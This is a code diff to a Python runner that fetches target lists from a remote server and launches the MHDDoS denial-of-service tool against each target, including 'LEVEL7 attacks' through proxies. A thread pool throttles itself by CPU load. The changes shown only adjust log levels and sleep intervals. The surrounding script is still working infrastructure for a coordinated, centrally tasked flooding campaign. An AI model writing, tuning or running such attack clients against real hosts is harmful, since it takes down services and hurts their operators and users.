@@ -110,14 +110,14 @@ def runner(config):
                 str(period)
             ]
         else:
-            logger.critical(
+            logger.info(
                 'No we cant run the LEVEL7 attacks without proxy. Skipping')
     try:
         subprocess.run([sys.executable, "MHDDoS/start.py", *params])
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
-        logger.critical(f"OOPS... {config.Dst} -> Some issue: {error=}")
+        logger.info(f"OOPS... {config.Dst} -> Some issue: {error=}")
 
 
 if __name__ == '__main__':
@@ -135,24 +135,28 @@ if __name__ == '__main__':
 
             logger.info("Getting fresh tasks from the server!")
             try:
+
                 for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
                     while int(psutil.cpu_percent()) > 70:
-                        logger.critical(
+                        logger.info(
                             "The CPU load is too high. Thread waiting...")
                         logger.info(
                             f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
+                        sleep(loop_time)
 
                     pool.add_task(runner, conf)
+                    sleep(loop_time / 4)
 
-                    logger.info(f"The system works good! Thanks :P ")
-                    sleep(5)
                 pool.wait_completion()
+
             except Exception as error:
-                logger.critical(f"OOPS... We faced an issue: %s", error)
-                logger.info(f"Retrying in %ds", RETRY_PERIOD_SEC)
+                logger.critical(f"OOPS... We faced an issue: {error}")
+                logger.info("The system works good! Thanks :P ")
+                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                 sleep(RETRY_PERIOD_SEC)
 
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
         logger.critical(f"OOPS... We faced an issue: {error=}")
+        logger.info("Please restart the tool! Thanks")
